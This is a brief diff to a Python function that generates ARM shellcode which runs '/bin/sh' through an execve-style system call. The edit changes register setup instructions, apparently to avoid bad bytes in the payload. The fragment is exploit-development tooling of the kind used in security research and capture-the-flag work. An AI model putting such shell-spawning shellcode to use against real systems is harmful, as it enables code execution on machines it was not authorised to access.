@@ -6,8 +6,9 @@ def generate(cmd='/bin/sh'):
     """
     sc = """
     mov  r0, pc
-    add  r0, #10
-    movs r2, #0
+    add  r0, #11
+    add  r0, r0, #1
+    sub r2, r2
     movs r7, #(0+ 11)
     push {r0, r2}
     mov  r1, sp
